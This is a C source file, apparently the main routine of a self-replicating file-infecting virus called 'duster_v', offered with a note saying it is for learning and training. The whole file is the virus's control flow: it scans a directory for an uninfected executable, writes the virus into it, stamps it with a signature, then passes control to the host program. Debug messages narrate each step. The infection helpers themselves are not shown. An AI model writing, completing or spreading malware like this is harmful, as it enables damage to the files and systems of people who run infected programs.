/*
 * duster_v_main.c
 *
 * Created on: Jan 3, 2022
 * Note: This piece of software is designed only for learning and training purposes.
 * Building a virus program with relatively ease should increase your awareness on system vulnerabilities at all times.
 */

#include "duster_v_main.h"

int main(int argc, char *argv[])
{
	long size_of_virus=VIRUS_SIZE;
	char *signature_of_virus=VIRUS_SIGNATURE;
	char *temporary_file_name=TEMPORARY_FILE_NAME;
	char *binary_file_name=argv[0];

	char *virus_file_name=argv[1];
	char *path_to_directory_where_to_act=argv[2];

#ifdef DEBUGMODE
	printf("Ooops, I have taken these values from the parameters:  name of the virus binary --> %s  and path to the directory where to infect ---> %s .\n",virus_file_name,path_to_directory_where_to_act);
#endif

	execute_virus_mission();

	char *target_file_name = search_for_target(path_to_directory_where_to_act,virus_file_name, signature_of_virus, strlen(signature_of_virus));

#ifdef DEBUGMODE
	printf("I found a good target for infection ---> %s.\n",target_file_name);
#endif

	if (target_file_name)
	{
#ifdef DEBUGMODE
    printf("Proceeding to infect the file  with the parameters 'target'=%s, 'binary-file-name'=%s, 'size-of-virus'=%ld.\n",target_file_name,virus_file_name,size_of_virus);
#endif
		int success = go_infect_the_target_file(target_file_name, virus_file_name, size_of_virus);

		if (success)
		{
			stamp_the_infected_file(target_file_name, signature_of_virus);
		}
	}

	if (!verify_is_original_file(virus_file_name,binary_file_name))
			{
				execute_action(binary_file_name, argv, temporary_file_name, size_of_virus, strlen(signature_of_virus));
			}

	return 0;

}
